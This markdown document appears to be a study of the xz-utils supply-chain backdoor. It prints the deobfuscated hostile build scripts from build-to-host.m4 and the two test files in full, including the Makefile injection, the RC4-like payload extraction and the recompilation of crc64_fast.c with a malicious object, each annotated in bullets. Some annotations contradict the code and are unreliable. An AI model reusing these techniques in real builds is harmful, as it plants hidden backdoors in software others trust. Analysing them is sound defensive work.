# Analysis xz scripts

### Reference Links
- [The xz attack shell script by Russ Cox](https://research.swtch.com/xz-script)

## Table

|Set Up|Exploit|Inject|
|:--------:|:--------:|:--------:|
|configure.ac|build-to-host.m4|Makefile|
|CMakeLists.txt|bad-3-corrupt_lzma2.xz|libtool|
|builds.sh|good-large_compressed.lzma|crc64_fast.c|
|-|liblzma_la-crc64_fast.o|crc_x86_clmul.h|


## Files
<!--Add liblzma_la-crc64_fast.o & crc_x86_clmul-->
### `configure.ac` / `CMakeLists.txt`

- Select a fast CRC function at startup time.(2023.06.22)
    - [configure.ac](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=23b5c36fb71904bfbe16bb20f976da38dadf6c3b)
    - [CMakeLists.txt](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=b72d21202402a603db6d512fb9271cfa83249639)


### `builds.sh`

- Disable ifunc support during oss-fuzz builds(2023.07.07)
    - [projects/xz/builds.sh](https://github.com/google/oss-fuzz/commit/d2e42b2e489eac6fe6268e381b7db151f4c892c5?diff=unified&w=0)


### `bad-3-corrupt_lzma2.xz` / `good-large_compressed.lzma`

- Hidden backdoor binary code(2024.02.23)
    - [tests/files/{backdoor_binary_codes}](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0)


### `build-to-host.m4`

- The attack kicks off with adding an unexpected support library(2024.02.24)
    - [m4/build-to-host.m4](https://salsa.debian.org/debian/xz-utils/-/blob/debian/5.6.0-0.2/m4/build-to-host.m4?ref_type=tags)


## Mechanism

### 1. `build-to-host.m4`
[m4/build-to-host.m4](/Unknown/xz-utils_backdoor/script/build-to-host.m4)
```sh
gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
if test -n "$gl_am_configmake"; then
  HAVE_PKG_CONFIGMAKE=1
else
  HAVE_PKG_CONFIGMAKE=0
fi
```
- `gl_am_configmake='./tests/files/bad-3-corrupt_lzma2.xz'`
- `HAVE_PKG_CONFIGMAKE=1`

```sh
gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
```
- `gl_[$1]_prefix='xz'`

```sh
gl_path_map='tr "\t \-_" " \t_\-"'
```
- `gl_path_map='tr "\t \-_" " \t_\-"'`

```sh
if test "x$gl_am_configmake" != "x"; then
  gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
else
  gl_[$1]_config=''
fi
```
- `gl_[$1]_config='sed \"r\n\" ./tests/files/bad-3-corrupt_lzma2.xz | eval 'tr "\t \-_" " \t_\-"' | xz -d 2>/dev/null'`
- `sed r\n` == `cat`
- `gl_[$1]_config=cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d`
- Deofuscate `tests/files/bad-3-corrupt_lzma2.xz`

```sh
AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
```
- Execute shell script


### 2. `bad-3-corrupt_lzma2.xz`
[test/files/bad-3-corrupt_lzma2.xz(Deobfuscated)](/Unknown/xz-utils_backdoor/script/bad-3-corrupt_lzma2.sh)
```sh
####Hello####
#�U��$�
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +939)";
(xz -dc $srcdir/tests/files/good-large_compressed.lzma|
    eval $i|tail -c +31233|
    tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")|
    xz -F raw --lzma1 -dc|/bin/sh
####World####
```
- If OS is not based on Linux, terminate script
- Set `srcdir`
- `(xz -dc $srcdir/tests/files/good-large_compressed.lzma | eval $i|tail -c +31233 | tr \114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377") | xz -F raw --lzma1 -dc|/bin/sh`
- This command Deofuscate `tests/files/good-large_compressed.lzma`


### 3. `good-large_compressed.lzma`
[test/files/good-large_compressed.lzma(Deobfuscated)](/Unknown/xz-utils_backdoor/script/good-large_compressed.sh)
```sh
P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
C="pic_flag=\" $P\""
O="^pic_flag=\" -fPIC -DPIC\"$"
R="is_arch_extension_supported"
x="__get_cpuid("
p="good-large_compressed.lzma"
U="bad-3-corrupt_lzma2.xz"
```
- Set variables

```sh
[ ! $(uname)="Linux" ] && exit 0
```
- Check if the OS is based on Linux
- But there is no whitespace around `=` so that this line do nothing.

```sh
eval $zrKcVq
```
- Not declared variable

```sh
if test -f config.status; then
    eval $zrKcSS
    eval `grep ^LD=\'\/ config.status`
    eval `grep ^CC=\' config.status`
    eval `grep ^GCC=\' config.status`
    eval `grep ^srcdir=\' config.status`
    eval `grep ^build=\'x86_64 config.status`
    eval `grep ^enable_shared=\'yes\' config.status`
    eval `grep ^enable_static=\' config.status`
    eval `grep ^gl_path_map=\' config.status`
```
- Check if `config.status` exists
- If `config.status` exists, print the variables in command

```sh
    vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2>/dev/null`
    if test "x$vs" != "x" > /dev/null 2>&1;then
        f1=`echo $vs | cut -d: -f1`
        if test "x$f1" != "x" > /dev/null 2>&1;then
            start=`expr $(echo $vs | cut -d: -f2) + 7`
            ve=`grep -broaF '|_!{ -' $srcdir/tests/files/ 2>/dev/null`
            if test "x$ve" != "x" > /dev/null 2>&1;then
                f2=`echo $ve | cut -d: -f1`
                if test "x$f2" != "x" > /dev/null 2>&1;then
                    [ ! "x$f2" = "x$f1" ] && exit 0
                    [ ! -f $f1 ] && exit 0
                    end=`expr $(echo $ve | cut -d: -f2) - $start`
                    eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
                fi
            fi
        fi
    fi
```
- Added in 5.6.1
- Find file that include string `~!:_ W` and `|_!{ -`
- Check for `$f1` and `$f2` is identical and if `$f1` is exists
- Run command `cat $f1 | tail -c +$(echo $vs | cut -d: -f2) + 7 | haed -c +$(echo $ve | cut -d: -f2) - $start | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`

```sh
    eval $zrKccj
    if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status > /dev/null 2>&1;then
        exit 0
    fi
    if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h > /dev/null 2>&1;then
        exit 0
    fi
```
- Check GNU indirect function support is enabled

```sh
    if test "x$enable_shared" != "xyes";then
        exit 0
    fi
```
- Check shared library support is enabled

```sh
    if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
        exit 0
    fi
```
- Check system is based on x86_64 Linux

```sh
    if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c > /dev/null 2>&1; then
        exit 0
    fi
    if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c > /dev/null 2>&1; then
        exit 0
    fi
    if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
        exit 0
    fi
    if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
        exit 0
    fi
```
- Check all crc ifunc codes
- [src/liblzma/check/crc64_fast.c](/Unknown/xz-utils_backdoor/script/crc64_fast.c)
- `src/liblzma/check/crc32_fast.c` is not used for exploit
- [src/liblzma/check/crc_x86_clmul.h](/Unknown/xz-utils_backdoor/script/crc_x86_clmul.h)

```sh
    if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
        exit 0
    fi
    if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
        exit 0
    fi
    LDv=$LD" -v"
    if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
        exit 0
    fi
```
- Check GCC and GNU ld is enabled

```sh
    if ! test -f "$srcdir/tests/files/$p" > /dev/null 2>&1;then
        exit 0
    fi
    if ! test -f "$srcdir/tests/files/$U" > /dev/null 2>&1;then
        exit 0
    fi
```
- Check if backdoor files exists
- `p="good-large_compressed.lzma"`
- `U="bad-3-corrupt_lzma2.xz"`
- (If there is no backdoor files, how this procedure could run..?)

```sh
    if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
        eval $zrKcst
```
- If `debian/rules` exists or `RPM_ARCH` is set to `xx86_64`, check below conditions.

```sh
        j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
        if ! grep -qs "$j" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        z="^am__uninstall_files_from_dir = {"
        if ! grep -qs "$z" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        w="^am__install_max ="
        if ! grep -qs "$w" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        E=$z
        if ! grep -qs "$E" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        Q="^am__vpath_adj_setup ="
        if ! grep -qs "$Q" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        M="^am__include = include"
        if ! grep -qs "$M" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        L="^all: all-recursive$"
        if ! grep -qs "$L" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
        if ! grep -qs "$m" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
        u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
        if ! grep -qs "$u" src/liblzma/Makefile > /dev/null 2>&1;then
            exit 0
        fi
```
- Check that `liblzma/Makefile` contains all the lines that will be used as anchor points later for inserting new text into the `Makefile`.

```sh
        if ! grep -qs "$O" libtool > /dev/null 2>&1;then
            exit 0
        fi
```
- Check `libtool` file with PIC configure
- `O="^pic_flag=\" -fPIC -DPIC\"$"`

```sh
        eval $zrKcTy
        b="am__test = $U"
```
- `U="bad-3-corrupt_lzma2.xz"`

```sh
        sed -i "/$j/i$b" src/liblzma/Makefile || true
```
- Insert `$b` to `$j` in `src/liblzma/Makefile`
- `j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"`
- `b="am__test = $U"`

```sh
        d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
        b="am__strip_prefix = $d"
        sed -i "/$w/i$b" src/liblzma/Makefile || true
```
- Insert `$b` to `$w` in `src/liblzma/Makefile`
- `w="^am__install_max ="`
- `b="am__test = $U"`

```sh
        b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
        sed -i "/$E/i$b" src/liblzma/Makefile || true
        b="\$(top_srcdir)/tests/files/\$(am__test)"
        s="am__test_dir=$b"
        sed -i "/$Q/i$s" src/liblzma/Makefile || true
```
- Insert `$b` to `$E` in `src/liblzma/Makefile`
- Insert `$s` to `$Q` in `src/liblzma/Makefile`
- `E=$z`
- `z="^am__uninstall_files_from_dir = {"`
- `b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/`
- `Q="^am__vpath_adj_setup ="`
- `b="\$(top_srcdir)/tests/files/\$(am__test)"`
- `s="am__test_dir=$b"`

<br>

---

```
am__test = bad-3-corrupt_lzma2.xz
am__strip_prefix = tr "\\t \\-_" " \\t_\\-"
am__dist_setup = $(am_strip_prefix) | xz -d 2>/dev/null | $(SHELL)
am__test_dir = $(top_srcdir)/tests/files/$(am__test)
```

---

<br>

```sh
        h="-Wl,--sort-section=name,-X"
        if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
            h=$h",-z,now"
        fi
        j="liblzma_la_LDFLAGS += $h"
        sed -i "/$L/i$j" src/liblzma/Makefile || true
```
- Add `liblzma_la_LDFLAGS += -Wl,--sort-section=name,-X` to `src/liblzma/Makefile`.
- If `liblzma_la_LDFLAGS` not set `-z`, `now` or `-Wl`, `now`, add `-z`, `now`.
- `-Wl, now` forces `LD_BIND_NOW` behavior
  - The dynamic loader resolves all symbols at program startup time <-> Lazy bind
  - One reason this is normally done is for security
  - Global Offset Table(GOT) and Procedure Linkage Tables(PLT) can be marked read-only early in process startup, so that buffer overflows or write-after-free bugs cannot target those tables
  - It also has the effect of running GNU indirect function (ifunc) resolvers at startup during that resolution process, and the backdoor arranges to be called from one of those.
  - This early invocation of the backdoor setup lets it run while the tables are still writable, allowing the backdoor to replace the entry for `RSA_public_decrypt` with its own version.
- `L="^all: all-recursive$"`
- `j="liblzma_la_LDFLAGS += $h"`

```sh
        sed -i "s/$O/$C/g" libtool || true
```
- libtool `pic_flag=" -fPIC -DPIC"` changes
- To libtool `pic_flag=" -fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"`
- Disable linker optimizations that could get in the way of subterfuge.

```sh
        k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
        sed -i "s/$u/$k/" src/liblzma/Makefile || true
        l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
            export top_srcdir='\$(top_srcdir)'; \\\\\n\
            export CC='\$(CC)'; \\\\\n\
            export DEFS='\$(DEFS)'; \\\\\n\
            export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
            export INCLUDES='\$(INCLUDES)'; \\\\\n\
            export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
            export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
            export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
            export CFLAGS='\$(CFLAGS)'; \\\\\n\
            export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
            export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
            export libdir='\$(libdir)'; \\\\\n\
            export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
            export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
        sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
        sed -i "/$m/i$l" src/liblzma/Makefile || true
        eval $zrKcHD
    fi
```
- `sed -i "s/$u/$k/" src/liblzma/Makefile || true`
- Changes `src/liblzma/Makefile`
- `u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"`
- `k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"`
`- sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";`
- `"am__test_dir=\$(top_srcdir)/tests/files/\$(am__test)"`
- `"am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"`
- `sed rpath {file}` == `cat {file}`
- `cat $(top_srcdir)/tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d 2>/dev/null | \$(SHELL)`
- Same as `cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d | /bin/sh`
- `m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"`
- Because of length, not gonna mention `l` in this line
- There is no assigned variables. Maybe `sed -i "/$m/i$l" src/liblzma/Makefile || true` is not used yet or subterfuge(Not mentioned in reference post)

```sh
elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then
```
- In this condition, assume `make` in the liblzma directory instead of running during `configure` in the tarball root directory

```sh
    vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null`
    if test "x$vs" != "x" > /dev/null 2>&1;then
        f1=`echo $vs | cut -d: -f1`
        if test "x$f1" != "x" > /dev/null 2>&1;then
            start=`expr $(echo $vs | cut -d: -f2) + 7`
            ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null`
            if test "x$ve" != "x" > /dev/null 2>&1;then
                f2=`echo $ve | cut -d: -f1`
                if test "x$f2" != "x" > /dev/null 2>&1;then
                    [ ! "x$f2" = "x$f1" ] && exit 0
                    [ ! -f $f1 ] && exit 0
                    end=`expr $(echo $ve | cut -d: -f2) - $start`
                    eval `cat $f1 | tail -c +${start} | head -c +${end} | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc`
                fi
            fi
        fi
    fi
```
- Added in 5.6.1
- Find file that include string `jV!.^%` and `%.R.1Z`
- Check for `$f1` and `$f2` is identical and if `$f1` is exists

```sh
cat (echo `grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null` | cut -d: -f1)\
| tail -c +(echo 'grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null' | cut -d: -f2) + 7\
| head -c +(echo 'grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null' | cut -d: -f2)\
- (echo 'grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null' | cut -d: -f2) + 7\
| tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377"\
| xz -F raw --lzma2 -dc
```
- <!--상단 스크립트 설명-->

```sh
cat $f1 | tail -c +(expr $(echo (grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null)) | cut -d: -f2) + 7) | head -c +(expr $(echo (grep -broaF '%.R.1Z' $top_srcdir/tests/files 2>/dev/null) | cut -d: -f2) - (expr $(echo (grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null) | cut -d: -f2) + 7)) | tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" | xz -F raw --lzma2 -dc
```
- 

```sh
    eval $zrKcKQ
    if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
        exit 0
    fi
    if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
        exit 0
    fi
    if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
        exit 0
    fi
    if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
        exit 0
    fi
```
- Check the ifunc-enabled CRC source files
- `R="is_arch_extension_supported"`
- `x="__get_cpuid("`

```sh
    if ! grep -qs "$C" ../../libtool; then
        exit 0
    fi
    if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
        exit 0
    fi
```
- Check whether the build configuration has the extra flags added previously.

```sh
    if echo $liblzma_la_LINK | grep -qs -e "lazy" > /dev/null 2>&1;then
        exit 0
    fi
```
- Check there is no `lazy` to the linker options, which might override the `-Wl`, `now`.

```sh
    N=0
    W=0
    Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
    eval $zrKcjv
    if test -z "$Y"; then
        N=0
        W=88664
    else
        N=88664
        W=0
    fi
```
- This is selecting between two different offset values depending on the content of `gettext.m4`.
- The distributed xz tarballs do not contain that string in gettext.m4 (It does appear in `build-to-host.m4`)
- So the grep finds nothing, `$Y` is the empty string, and the true case of the if executes: `N=0` and `W=88792`

```sh
    xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" |
```
- `p="good-large_compressed.lzma"`
- `i` is exists in `bad-3-corrupt_lzma2.xz`
- `sed` command is inserting a newline after every byte of that output
- Setting up for piping into the remainder of the command line

```sh
LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' |
```
- RC4-like decryption function
- The code above was for 5.6.1
- In 5.6.0, second loop count set to 4096 instead of 8192

```sh
xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
```
- `--single-stream` flag says to stop at the end of the first xz EOF marker instead of looking for additional files on standard input.
- This avoids reading the section of the input that we extracted with the `tail` command before. <!--추가 설명-->
- Write to `liblzma_la-crc64-fast.o`
- `N=0`
- `W=88664`
- `xz -dc --single-stream | ((head -c +88664 > /dev/null 2>&1) && head -c +0) > liblzma_la-crc64-fast.o || true`

```sh
xz -dc ./tests/files/good-large_compressed.lzma\
| eval "((head -c +1024 >/dev/null) && head -c +2048\
        && (head -c +1024 >/dev/null) && head -c +2048\
        && (head -c +1024 >/dev/null) && head -c +2048\
        && (head -c +1024 >/dev/null) && head -c +2048\
        && (head -c +1024 >/dev/null) && head -c +2048\
        && (head -c +1024 >/dev/null) && head -c +2048\
        && (head -c +1024 >/dev/null) && head -c +2048\
        && (head -c +1024 >/dev/null) && head -c +2048\
        && (head -c +1024 >/dev/null) && head -c +2048\
        && (head -c +1024 >/dev/null) && head -c +2048\
        && (head -c +1024 >/dev/null) && head -c +2048\
        && (head -c +1024 >/dev/null) && head -c +2048\
        && (head -c +1024 >/dev/null) && head -c +2048\
        && (head -c +1024 >/dev/null) && head -c +2048\
        && (head -c +1024 >/dev/null) && head -c +2048\
        && (head -c +1024 >/dev/null) && head -c +2048\
        && (head -c +1024 >/dev/null) && head -c +939)"\
| LC_ALL=C sed "s/\(.\)/\1\n/g"\
| LC_ALL=C awk\
'BEGIN
{
    FS="\n";
    RS="\n";
    ORS="";
    m=256;
    for(i=0;i<m;i++)
    {
        t[sprintf("x%c",i)]=i;
        c[i]=((i*7)+5)%m;
    }
    i=0;
    j=0;
    for(l=0;l<8192;l++)
    {
        i=(i+1)%m;
        a=c[i];
        j=(j+a)%m;
        c[i]=c[j];
        c[j]=a;
    }
}
{
    v=t["x" (NF<1?RS:$1)];
    i=(i+1)%m;
    a=c[i];
    j=(j+a)%m;
    b=c[j];
    c[i]=b;
    c[j]=a;
    k=c[(a+b)%m];
    printf "%c",(v+k)%m
}'\
| xz -dc --single-stream\
| ((head -c +0 > /dev/null 2>&1) && head -c +88664) > liblzma_la-crc64-fast.o\
|| true
```
- [liblzma_la-crc64-fast.o](/Unknown/xz-utils_backdoor/bin/liblzma_la-crc64-fast.o)
- First extracted the injected code in isolation  
[liblzma_la-crc64-fast_o_gz.bin](/Unknown/xz-utils_backdoor/bin/liblzma_la_crc64_fast_o_gz.bin) by Florian Weimer

```sh
    if ! test -f liblzma_la-crc64-fast.o; then
        exit 0
    fi
```
- If failed the process that create `liblzma_la-crc64-fast.o`, exit script

```sh
    cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true
```
- Copy the original file for backup

```sh
    V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19); return success && (r[2] & ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported'
```
- Inject this code to `crc64_fast.c`

```sh
    eval $yosA
    if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
    sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
    sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
    $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then
```
- This if statement is running a pipeline of `sed` commands piped into `$CC` with the arguments `liblzma_la-crc64-fast.o` (adding that object as an input to the compiler) and `-x c -` (compile a C program from standard input).
- It rebuilds an edited copy of crc64_fast.c (a real xz source file) and merges the extracted malicious .o file into the resulting object, overwriting the underscored real object file that would have been built originally for crc64_fast.c.
- The sed 1i tells the compiler the file name to record in debug info, since the compiler is reading standard input
- [src/liblzma/check/crc64_fast.c](/Unknown/xz-utils_backdoor/script/crc64_fast.c)

<br>

- [injected-crc64_fast.c](/Unknown/xz-utils_backdoor/script/crc64_fast-injected.c)
- That is, the crc64_resolve function, which is the ifunc resolver that gets run early in dynamic loading, before the GOT and PLT have been marked read-only, is now calling the newly inserted `_is_arch_extension_supported`, which calls `_get_cpuid`.
- `_get_cpuid` is provided by the backdoor .o, and it does a lot more before returning the cpuid information. In particular it rewrites the GOT and PLT to hijack calls to `RSA_public_decrypt`.

```sh
        cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
        eval $BPep
        if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
            sed "/include \"crc32_arm64.h\"/a \\$V" | \
            sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
            $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
```
- Do same process when injecting script in `src/liblzma/check/crc64_fast.c`
- But there is no malicious object file named `liblzma_la-crc32.o` like `liblzma_la-crc64-fast.o`

```sh
            eval $RgYB
            if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
```
- 

```sh
                if test ! -f .libs/liblzma.so; then
                    mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
                    mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
                fi
```
- 

```sh
                rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
```
- 

```sh
            else
                mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
                mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
            fi
```
- 

```sh
            rm -f .libs/liblzma_la-crc32-fast.o || true
            rm -f .libs/liblzma_la-crc64-fast.o || true
```
- 

```sh
        else
            mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
            mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
        fi
```
- 

```sh
    else
        mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
    fi
```
- 

```sh
    rm -f liblzma_la-crc64-fast.o || true
```
- 

```sh
fi
eval $DHLd
```
- 